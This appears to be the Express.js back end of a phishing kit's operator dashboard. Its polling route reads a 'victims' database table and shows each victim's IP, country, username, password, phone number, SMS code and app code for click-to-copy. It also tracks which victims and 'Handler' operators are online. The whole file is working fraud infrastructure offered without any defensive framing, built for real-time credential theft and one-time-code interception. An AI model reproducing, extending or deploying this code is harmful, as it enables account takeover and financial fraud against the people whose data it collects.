const express = require('express');
const router = express.Router();
const db = require('../lib/db');

function requireAdmin(req, res, next) {
  if (!req.session.loggedin) return res.status(403).json({ error: 'Unauthorized' });
  next();
}

const statusMap = {};
const statusJsonPath = require('path').join(__dirname, '..', 'public', 'status.json');
try {
  const fs = require('fs');
  const data = fs.readFileSync(statusJsonPath, 'utf8');
  Object.assign(statusMap, JSON.parse(data));
} catch (e) {
  // fallback
}

function useragentToBrowser(ua) {
  if (!ua) return "<i class='fa fa-question-circle fa-lg'></i>";
  if (ua.includes('Firefox')) return "<i class='fa fa-firefox fa-lg'></i>";
  if (ua.includes('Chrome') && !ua.includes('Edg')) return "<i class='fa fa-chrome fa-lg'></i>";
  if (ua.includes('Safari')) return "<i class='fa fa-safari fa-lg'></i>";
  if (ua.includes('Edg')) return "<i class='fa fa-edge fa-lg'></i>";
  return "<i class='fa fa-question-circle fa-lg'></i>";
}

function checkOnline(lastseen) {
  if (!lastseen) lastseen = 0;
  const ts = typeof lastseen === 'number' ? lastseen : parseInt(lastseen) || 0;
  const now = Math.floor(Date.now() / 1000);
  const threshold = now - 9;
  return (ts >= threshold)
    ? "<code style='font-size: 12px;background-color: green;color: white;'><b>online</b></code>"
    : "<code style='font-size: 12px;background-color: red;color: white;'><b>offline</b></code>";
}

function statusToBadge(stsCode) {
  const sts = statusMap[String(stsCode)];
  if (!sts) return stsCode || '';
  return "<code style='font-weight: bold; background-color: #004466; color: #FFFFFF; padding: 3px 6px; border-radius: 4px;'>" + sts + "</code>";
}

function generateVictimRow(v) {
  const lastseenHtml = checkOnline(v.lastseen);
  const badge = statusToBadge(v.status);
  const browserIcon = useragentToBrowser(v.useragent);

  return "<td style='vertical-align:middle; color: black; font-size: 14px; font-weight: 500;' scope='row'>" + (v.id || '') + "</td>"
    + "<td style='vertical-align:middle;'>" + lastseenHtml + "</td>"
    + "<td style='vertical-align:middle; color: black; font-size: 14px;'>" + (v.ip || '') + "</td>"
    + "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: black; font-size: 14px; font-weight: 500;' title='Click to copy'>" + (v.country || '') + "</td>"
    + "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: black; font-size: 15px; font-weight: 500;' title='Click to copy'>" + (v.user || '') + "</td>"
    + "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: black; font-size: 15px;' title='Click to copy'>" + (v.pass || '') + "</td>"
    + "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: black; font-size: 15px;' title='Click to copy'>" + (v.phone || v.phonenumber || v.namephone || '') + "</td>"
    + "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: black; font-size: 15px;' title='Click to copy'>" + (v.smscode || '') + "</td>"
    + "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: black; font-size: 15px;' title='Click to copy'>" + (v.appcode || '') + "</td>"
    + "<td data-micron='flicker' onclick='copyTextToClipboard(this)' style='vertical-align:middle; cursor:pointer; color: black; font-size: 15px;' title='Click to copy'>" + (v.resendtap || '') + "</td>"
    + "<td style='white-space: nowrap; vertical-align:middle; color: black; font-size: 15px;white-space: nowrap;'>" + badge + "</td>";
}

router.get('/', requireAdmin, async (req, res) => {
  try {
    const now = Math.floor(Date.now() / 1000);
    const threshold = now - 9;

    if (req.session.role === 'Handler') {
      await db.query('UPDATE handlers SET lastseen = ? WHERE username = ?', [now, req.session.username]);
    }

    const victims = await db.query('SELECT * FROM victims ORDER BY id DESC');
    const totalVictims = (await db.query('SELECT COUNT(*) as count FROM victims'))[0]?.count || 0;
    const totalVisits = (await db.query('SELECT COUNT(*) as count FROM visits'))[0]?.count || 0;

    let onlineVictims = 0;
    const output = [];
    const removedIds = [];

    for (const v of victims) {
      if (parseInt(v.lastseen) > threshold) onlineVictims++;
      if (parseInt(v.is_removed) === 1) {
        removedIds.push('row' + v.id);
      } else {
        const rowHtml = generateVictimRow(v);
        output.push({
          id: 'row' + v.id,
          buzzed: v.buzzed || '1',
          info: Buffer.from(rowHtml).toString('base64')
        });
      }
    }

    const activeHandlers = (await db.query('SELECT COUNT(*) as count FROM handlers WHERE lastseen > ?', [threshold]))[0]?.count || 0;

    res.json({
      total_visits: totalVisits,
      total_victims: totalVictims,
      online_victims: onlineVictims,
      active_handlers: activeHandlers,
      removed_ids: removedIds,
      victims: output
    });
  } catch (err) {
    console.error('Polling API error:', err);
    res.json({ total_visits: 0, total_victims: 0, online_victims: 0, active_handlers: 0, removed_ids: [], victims: [] });
  }
});

module.exports = router;
